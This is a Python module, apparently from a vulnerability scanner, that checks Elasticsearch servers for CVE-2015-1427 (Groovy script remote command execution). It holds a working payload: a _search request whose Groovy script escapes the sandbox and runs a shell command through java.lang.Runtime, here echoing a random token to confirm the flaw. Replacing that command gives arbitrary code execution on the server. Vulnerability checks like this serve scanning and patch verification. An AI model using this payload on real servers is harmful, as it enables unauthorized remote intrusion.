#!/usr/bin/env python3

import json
from app.lib.request import request
from app.lib.common import get_capta, get_useragent

class CVE_2015_1427_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2015-1427漏洞',
            'description': 'CVE-2015-1427漏洞漏洞可执行任意命令,影响范围为: Elasticsearch < 1.3.8, 1.4.0~1.4.3',
            'date': '2015-01-31',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers = {
            'User-Agent': get_useragent(),
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        self.capta = get_capta()
        self.data_payload = {"name": "test"}
        self.check_payload = {"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"echo %s\").getText()" %(self.capta)}}} 

    async def check(self):
        
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        try:
            data_req = await request.post(self.url + '/website/blog/', data = json.dumps(self.data_payload), headers = self.headers)
            check_req = await request.post(self.url + '/_search?pretty', data = json.dumps(self.check_payload), headers = self.headers)
            if check_req.status == 200 and self.capta in json.loads(await check_req.text())["hits"]["hits"][0]["fields"]["lupin"][0]:
                return True
            
        except Exception as e:
            # print(e)
            pass

if  __name__ == "__main__":
    CVE_2015_1427 = CVE_2015_1427_BaseVerify('http://192.168.30.242:9200')
    CVE_2015_1427.check()


